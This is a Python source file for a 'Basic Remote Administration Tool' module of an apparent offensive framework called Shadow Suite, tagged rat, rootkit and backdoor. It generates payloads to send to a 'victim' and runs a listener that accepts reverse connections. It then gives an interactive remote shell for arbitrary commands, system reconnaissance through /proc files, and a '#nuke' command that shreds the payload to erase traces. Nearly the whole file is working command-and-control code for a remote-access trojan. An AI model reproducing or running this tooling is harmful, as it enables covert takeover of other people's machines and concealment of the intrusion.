########################################################################################
#                                                                                      #
#                       MODULE FOR SHADOW SUITE LINUX EDITION                          #
#                                                                                      #
########################################################################################
# Coding=UTF-8

module_version = 7.2

# Import directives
try:
    import os
    import sys
    import traceback
    from core import error
    from core.logger import log
    import API

    # Place your 'import' directives below
    import socket
    from time import asctime
    from time import sleep

    import_error = False

except ImportError:
    print("[!] A module is missing! Please install the required modules...")
    print("==================== TRACEBACK ====================")
    traceback.print_exc()
    print("===================================================")
    import_error = True

# Put your module information here.
info = {
        "name": "Basic Remote Administration Tool", # Module filename (Change this; I recommend you to use the filename as the module name.)
        "version": "1.3", # version
        "author": "Catayao56", # Author
        "desc": "A Basic Remote Administration Tool for machines with low-security.", # Brief description
        "email": "Catayao56@gmail.com", # Email
        "authorinfo": "https://github.com/Catayao56/", # Additional information about the author; this could be
        "lastupdate": "May. 13, 2018",                     # a website of the author.
        # The date format is MONTH, DD, YYYY e.g.: Jan. 4, 2018
        "usingapi": "True", # Is this module using Shadow Suite's API?
        "needsroot": "1", # Does this module needs root permissions?
                                          # 0 == True; any number means false.
}
dependencies = ['BINARY: python3'] # Put needed dependencies here.
module_status = 0 # 0  == Stable, 1 == Experimental, 2 == Unstable, 3 == WIP
category = ['all', 'python', 'catayao56', 'rat', 'rootkit', 'back', 'door', 'remote', 'admin', 'access', 'post', 'exploitation']

# Changelog of the module
changelog = "Version 1.0:\nInitial module release"
# Changelog format:
#
# changelog = "Version 2.0:\nUpdate Description\n\nVersion1.0\nInitial module release"

# Prints the module information
def module_info():
    # Unofficial way to convert integer to Boolean
    # (well, not really a boolean, as it is a string).
    # if [argument] == 0 then True; Otherwise, False.
    if info['needsroot'] == "0":
        superm = "True"
    else:
        superm = "False"

    print("Module Name: " + info['name'])
    print("Module Version: " + info['version'])
    print("Module Author: " + info['author'])
    print("Module Description: " + info['desc'])
    print()
    print("Module Author's Email: " + info['email'])
    print("Module Author's Info: " + info['authorinfo'])
    print("Module's last update: " + info['lastupdate'])
    print("Shadow Suite API Support: " + info['usingapi'])
    print("Needs root: " + superm)
    print()
    # Prints the dependencies via for loop. I just copy/pasted it from a reference book
    # and modified it XD
    print("Dependencies:", end=' ')
    for item in dependencies:
        print(item, ",", end=' ')
    print()
    # Prints the changelog of the module.
    print("Changelog:\n" + "\n" + changelog)
    print("\n\n")

# Main module function
def main(global_variables):
    if import_error is True:
        return None

    else:
        """ First, it checks the value assigned to the 'needsroot' variable in the 
        dictionary 'info', then if the value is equal to zero, it calls the 'geteuid()'
        function from the 'os' module. If the result from geteuid is also zero, then
        the module will call the function 'module_body()'. Otherwise, it will print an
        error message. If the value assigned to the 'needsroot' variable in the dictionary
        'info' is not equal to zero, then the module will not call the 'geteuid()' function
        from the 'os' module, and will immediately call 'module_body()' function. """
        if info['needsroot'] == "0":
            if os.geteuid() != 0:
                print(error.errorCodes().ERROR0005)
                return 0

            else:
                module_body(global_variables)

        else:
            module_body(global_variables)

def module_body(global_variables):
    # To support module versions older than v7.0
    API_ShadowSuite = API.ShadowSuite(global_variables['current_user'], global_variables['MODULE_PATH'], global_variables['OUTPUT_PATH'], global_variables['SESSION_ID'], global_variables['USERLEVEL'], global_variables['DEBUGGING'])
    misc = API.misc
    pf = misc.programFunctions()

    lhost = '127.0.0.1'
    lport = 1337
    payload_type = 'default.py'
    output_path = global_variables['OUTPUT_PATH']
    PAYLOAD_PATH = 'modules/BRAT/payloads/'
    payload_filename = 'payload' # For output

    print()
    print(info['name'] + " v" + info['version'] + " by " + info['author'])
    print(pf.COPYRIGHT)
    print()
    while True:
        try:
            if '.py' not in payload_filename:
                payload_filename += '.py'

            if payload_filename in os.listdir(output_path):
                payload_filename += '.py'

            output_filename = output_path + payload_filename
            if global_variables['USERLEVEL'] == 0:
                command = input("[" + global_variables['current_user'] + "@127.0.0.1] # ")

            else:
                command = input("[" + global_variables['current_user'] + "@127.0.0.1] $ ")

            if command.lower().startswith('help'):
                print()
                print("help                    :: print this help menu.")
                print("manual                  :: print the basic usage information.")
                print()
                print("show [OPTION]           :: show values in [OPTION].")
                print("set [OPTION] [VALUE]    :: set [VALUE] for [OPTION].")
                print("generate                :: generate payload to send to victim.")
                print("start [OPTION]          :: start listener/server.")
                print()
                print("quit || exit            :: quit BRAT.")
                print()

            elif command.lower().startswith('manual'):
                print()
                print("[1] Set LHOST, LPORT, PAYLOAD_TYPE, and OUTPUT_PATH.")
                print("[2] Generate payload.")
                print("[3] Send and start payload to victim.")
                print("[4] Start your server and enjoy! :D")
                print()

            elif command.lower().startswith(('show', 'list', 'lst', 'ls')):
                try:
                    command = command.split(' ')
                    if command[1].lower() in ('value', 'values'):
                        print()
                        print("LHOST:                   " + str(lhost))
                        print("LPORT:                   " + str(lport))
                        print("Payload Type:            " + str(payload_type))
                        print("Payload Output filename: " + str(payload_filename))
                        print()

                    elif command[1].lower() in ('payload', 'payloads'):
                        print()
                        print("Currently Available Payloads: ")
                        print()
                        payloads = os.listdir(PAYLOAD_PATH)
                        iterator = 0
                        
                        for payload in payloads:
                            iterator += 1
                            print("[" + str(iterator) + "] " + payload)

                        del iterator
                        print()

                except:
                    print()
                    print("Usage: show [OPTION]")
                    print()
                    print("values   :: show current values like LHOST, LPORT, and more.")
                    print("payloads :: show available payloads.")
                    print()

            elif command.lower().startswith('set'):
                try:
                    command = command.split(' ')
                    if command[1].lower() in ('lhost', 'host'):
                        lhost = str(command[2])
                        print("LHOST set!")

                    elif command[1].lower() in ('lport', 'port'):
                        lport = int(command[2])
                        print("LPORT set!")

                    elif command[1].lower() in ('payload', 'type'):
                        if pf.path_exists(PAYLOAD_PATH + command[2]):
                            payload_type = str(command[2])
                            print("Payload type set!")

                        else:
                            print("No payload template with that filename is found.")

                    elif command[1].lower() in ('output', 'path'):
                        ouput = command[2]
                        while pf.path_exists(PAYLOAD_PATH + ouput):
                            ouput += '.py'

                        else:
                            payload_filename = ouput

                except Exception as err:
                    print()
                    print("==========" + str(err) + "==========")
                    print()
                    print("Usage: set [OPTION]")
                    print()
                    print("LHOST   :: set local host IP to connect.")
                    print("LPORT   :: set local port to connect.")
                    print("PAYLOAD :: set payload type to use.")
                    print("OUTPUT  :: set output path.")

            elif command.lower() in ('generate', 'export'):
                payload = PAYLOAD_PATH + payload_type
                output = output_path + payload_filename
                try:
                    payload_script = open(payload, 'r').read()
                    open(payload, 'r').close()
                    payload_script = payload_script.format(lhost, lport)
                    open(output, 'a').write(payload_script)
                    open(output, 'a').close()
                
                except Exception as errno:
                    print("==========" + str(errno) + "==========")
                
                else:
                    print('"' + output + '" successfully generated!')
                    print()
                    print("Now, modify, send, and start it to your victim's machine and...")
                    print()
                    print("BOOM! We got access!")
                    print()
                    print("[WARNING] DON'T FORGET TO RE-READ THE CODE!")
                    print()

            elif command.lower().startswith(('start', 'begin')):
                try:
                    command = command.split(' ')
                    #print(len(command))
                    if len(command) == 2:
                        if command[1].lower() not in ('custom'):
                            continue

                        custom_lhost = input("Start server on IP (default: 127.0.0.1) > ")
                        while True:
                            custom_lport = int(input("Start server on Port (default: 1337) > "))
                            if type(custom_lport) is int and custom_lport < 1 and custom_lport > 65535:
                                continue

                            else:
                                break

                        listener(custom_lhost, custom_lport, global_variables)

                    elif len(command) == 1:
                        listener(lhost, lport, global_variables)

                    else:
                        raise IndexError

                except IndexError:
                    print()
                    print("Usage: start [OPTION]")
                    print()
                    print("custom :: Start server with custom LHOST and LPORT.")
                    print()

            elif command.lower().startswith(('quit', 'exit')):
                print()
                print(API_ShadowSuite.FINISH)
                break

            else:
                print("[ERROR] Unknown command '" + command + "'.")
                continue

        except Exception as error:
        #except ImportError as error: # DEV0005: For debugging purposes only.
            print("[ERROR] " + str(error))
            continue

def raw_converter(string):
    string = str(string)
    n = r'\n'
    t = r'\t'
    bs = r"b'"
    be = r"\n'"
    
    result = string.replace(bs, '')
    result = result.replace(be, r'\n')
    result = result.replace(n, '\n')
    result = result.replace(t, '\t')
    return result

def listener(lhost, lport, global_variables):
    try:
        #print(type(lhost)) # DEV0005: For debugging purposes only.
        #print(type(lport)) # DEV0005: For debugging purposes only.
        assert(type(lhost) is str), "Invalid LHOST!"
        assert(type(lport) is int), "Invalid LPORT!"
        if lport < 1 or lport > 65535:
            raise AssertionError("Invalid LPORT range! (must be 1-65535)")

        else:
            pass

    except AssertionError as assert_err:
    #except ImportError as assert_err:
        print("[ERROR] " + str(assert_err))
        return None

    print("[" + global_variables['current_user'] + "@127.0.0.1] " + asctime() + ": Listening on port " + str(lport) + "...")
    sleep(1)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((lhost, lport))
        s.listen(5)
        print("[" + global_variables['current_user'] + "@127.0.0.1] " + asctime() + ": Waiting Connection From Client...")
        sock_obj, addr_inf = s.accept()
        print(('[' + global_variables['current_user'] + "@" + addr_inf[0] + "] "  + asctime() + ': Session Opened | ' + 'IP: ' + addr_inf[0] + ' | Port: ' + str(addr_inf[1]) + '\n'))
        sleep(2)

    except OSError as error:
    #except ImportError as error: # DEV0005: For debugging purposes only.
        print('[ERROR] ' + str(error))
        return None

    try:
        RAT_Shell(lhost, lport, global_variables, sock_obj, addr_inf[0], addr_inf[1])

    except(KeyboardInterrupt, EOFError) as kb_int:
        print("[WARNING] " + str(kb_int))
        return None

    except socket.error:
        print("[ERROR] Connection closed by foreign host...")
        print()
        print("\t" + misc.FB + misc.CG + "+" + misc.FR + misc.CW + " The user may have found a way to delete the payload")
        print("\t" + misc.FB + misc.CG + "+" + misc.FR + misc.CW + " The internet connection of the user (or even yours) may be lost.")

def RAT_Shell(lhost, lport, global_variables, sock_obj, rhost, rport):
    """
    We didn't need the 'payload_filename' variable because the user might have renamed the
    payload.
    """
    rplatform = sock_obj.recv(1024)
    rplatform = raw_converter(rplatform)

    msg = 'BRAT'
    msg = msg.encode()
    sock_obj.send(msg)

    rpayload_name = sock_obj.recv(1024)
    rpayload_name = raw_converter(rpayload_name)

    rplatform = rplatform.replace("'", '')
    rplatform = rplatform.replace('"', "")
    rpayload_name = rpayload_name.replace("'", '')
    rpayload_name = rpayload_name.replace('"', "")
    print()
    print("Remote Platform:     " + rplatform)
    print("Remote Payload Name: " + rpayload_name)
    print()

    # Commands to encode
    if rplatform in ('windows', 'win', 'nt'):
        pass

    else:
        kernel_info = 'cat /proc/version'
        meminfo = 'cat /proc/meminfo'
        nuke_it = 'shred --force -n 35 -u -v -z \'' + rpayload_name + '\''
        cpuinfo = 'cat /proc/cpuinfo'
        crypto = 'cat /proc/crypto'
        check_root = 'which su'
        check_partitions = 'cat /proc/partitions'
    
    # Encoding process of commands
    kernel_info = kernel_info.encode()
    meminfo = meminfo.encode()
    nuke_it = nuke_it.encode()
    cpuinfo = cpuinfo.encode()
    crypto = crypto.encode()
    check_root = check_root.encode()
    check_partitions = check_partitions.encode()

    print("[i] Type '#help' for information.")
    while True:
        cmd = input('[' + asctime() + ' | ' + global_variables['current_user'] + '@' + rhost + '] ')

        if cmd == '#meminfo':
            sock_obj.send(meminfo)
            output = sock_obj.recv(100000)
            output = raw_converter(output)
            print(output)

        elif cmd == '#cpuinfo':
            sock_obj.send(cpuinfo)
            output = sock_obj.recv(100000)
            output = raw_converter(output)
            print(output)

        elif cmd == '#crypto':
            sock_obj.send(crypto)
            output = sock_obj.recv(100000)
            output = raw_converter(output)
            print(output)

        elif cmd == '#kernel_info':
            sock_obj.send(kernel_info)
            ab = sock_obj.recv(100000)
            ab = raw_converter(ab)
            print(("\n[+] \033[37;1mKernel Version : "+str(ab)))

        elif cmd == '#check_root':
            sock_obj.send(check_root)
            a = sock_obj.recv(100000)
            if a == r'\n/system/bin/su\n':
                print("\n[*] This Device Is Rooted...\n")

            else:
                print("\n[*] This Device Is Not Rooted...\n")

        elif cmd == '#su':
            print("\n[*] Command 'SU' Not *Yet* Working...\n")
            continue

        elif cmd == '#check_partitions':
            sock_obj.send(check_partitions)
            print('')
            output = sock_obj.recv(1000000)
            output = raw_converter(output)
            print(output)

        elif cmd == '#help':
            print("""
=====COMMANDS=====
#help            : Shows this help menu
#nuke            : Shred and delete the payload from the victim's machine
#logout          : Disconnect to client, & keep connection opened for future reconnection.

=====SHORTCUTS=====
#kernel_info      : Check Kernel Version
#meminfo          : Check Info Memory Target
#cpuinfo          : Check Info CPU Target
#crypto           : Check Encoding On Target
#check_partitions : Check Info Partisi On Target

[INFO] You can send any command as long as the remote machine can execute it.
""")

        elif cmd == '#nuke':
            sock_obj.send(nuke_it)
            output = sock_obj.recv(100000)
            output = raw_converter(output)
            print(output)

        elif cmd == '#logout':
            #c.close() # We did not close the connection because if we do so, the client will not restart.
            print("[" + asctime() + "] Connection closed by local host...")
            break
        
        else:
            cmd = cmd.encode()
            sock_obj.send(cmd)
            results = sock_obj.recv(100000)
            results = raw_converter(results)
            if results == 'bacod':
                continue
            
            print(results)
